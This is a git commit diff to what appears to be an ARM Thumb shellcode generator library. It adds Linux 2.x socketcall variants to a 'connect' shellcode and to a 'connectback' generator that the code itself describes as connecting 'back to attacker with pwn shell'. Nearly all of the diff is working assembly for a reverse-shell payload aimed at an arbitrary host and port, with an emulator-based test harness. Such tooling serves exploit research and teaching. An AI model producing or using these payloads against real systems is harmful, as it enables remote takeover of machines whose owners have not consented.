c300116f970eb2459020b4bce081fe96255700d1
alex.park <tae002@naver.com>
2016-09-01 15:22:35 +0900

    added socketcall for old linux kernel

--- shellcodes/thumb/connect.py
+++ shellcodes/thumb/connect.py
@@ -7,45 +7,87 @@ def binary_ip(host):
 def u32(u):
     return unpack("<I", u)[0]
 
-def generate(host='127.0.0.1', port=31337):
+def generate(host='127.0.0.1', port=31337, version=3):
     """Connects to remote machine on specific port
 
     Args:
         host(str): hostname or IP address
 
         port(int/str): specific port
+
+        version(int): 2 is old linux kernel including 2.x (default: 3)
     """
 
-    sc = """
-    movs r0, #2
-    movs r1, #1
-    subs r2, r2, r2
-    subs r7, r7, r7
-    adds r7, r7, #255
-    adds r7, r7, #26
-    svc 1
-    #adr r1, sockaddr_1
-    mov r1, pc
-    adds r1, #12
-    movs r2, #16
-    movs r3, #2
-    mov r6, r0
-    strh r3, [r1]
-    b after_sockaddr_2
-    subs r1, r1, r1
+    if int(version) == 3:
+        sc = """
+        movs r0, #2
+        movs r1, #1
+        subs r2, r2, r2
+        subs r7, r7, r7
+        adds r7, r7, #255
+        adds r7, r7, #26
+        svc 1
+        #adr r1, sockaddr_1
+        mov r1, pc
+        adds r1, #12
+        movs r2, #16
+        movs r3, #2
+        mov r6, r0
+        strh r3, [r1]
+        b after_sockaddr_2
+        subs r1, r1, r1
 
-sockaddr_1:
-    .short 0x4141
-    .short %s
-    .word  %s
-    
-after_sockaddr_2:
-    subs r7, r7, r7
-    adds r7, r7, #255
-    adds r7, r7, #28
-    svc 1
-    """ % (htons(int(port)), u32(binary_ip(host)))
-    return sc
+    sockaddr_1:
+        .short 0x4141
+        .short %s
+        .word  %s
+        
+    after_sockaddr_2:
+        subs r7, r7, r7
+        adds r7, r7, #255
+        adds r7, r7, #28
+        svc 1
+        """ % (htons(int(port)), u32(binary_ip(host)))
+        return sc
+    elif int(version) == 2:
+        # for old linux kernel
+        sc = """
+        /* socketcall( socket, { 2, 1, 6 } ) */
+        movs r1, #2
+        movs r2, #1
+        movs r3, #6
+        push {r1-r3}
+        movs r0, #1
+        mov  r1, sp
+        movs r7, #102
+        svc 1
+
+        mov  r6, r0
+        /* socketcall(connect, {fd, sockaddr_1, len(sockaddr_1)})  */
+        mov  r1, pc
+        adds r1, #18
+        movs r2, #16
+        movs r3, #2
+        strh r3, [r1]
+        push {r0-r3}
+        movs r0, #3
+        mov  r1, sp
+        movs r7, #102
+        svc 1
+        b after_connect
+
+    sockaddr_1:
+        .short 0x4141
+        .short %s
+        .word  %s
+
+    after_connect:
+
+        """ % (htons(int(port)), u32(binary_ip(host)))
+        return sc
+    else:
+        print "Not implemented yet"
+        return None
 
 def testcase(host='127.0.0.1', port=31337):
     import ARMSCGen as scgen
--- shellcodes/thumb/connectback.py
+++ shellcodes/thumb/connectback.py
@@ -13,22 +13,23 @@ def binary_ip(host):
 def u32(u):
     return unpack("<I", u)[0]
 
-def generate(host='127.0.0.1', port=31337, sock='r6'):
+def generate(host='127.0.0.1', port=31337, version=3, sock='r6'):
     """connection back to attacker with pwn shell on specific port in Thumb Mode
 
     argument:
         host (str)    : specific IP address or hostname
         port (int/str): specific port
+        version(int)  : 2 is old linux kernel including 2.x (default: 3)
         sock (int/str): sock descriptor for dupsh()
     """
-    sc =  connect.generate(host, port)
+    sc =  connect.generate(host, port, version)
     sc += dupsh.generate(sock)
 
     return sc    
 
-def testcase(host='127.0.0.1', port=31337, sock='r6'):
+def testcase(host='127.0.0.1', port=31337, version=3, sock='r6'):
     import ARMSCGen as scgen
-    sc = scgen.ks_asm('thumb', generate(host, port, sock))[0]
+    sc = scgen.ks_asm('thumb', generate(host, port, version, sock))[0]
     sclen = len(sc)
     print "[+] Registers information"
     scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
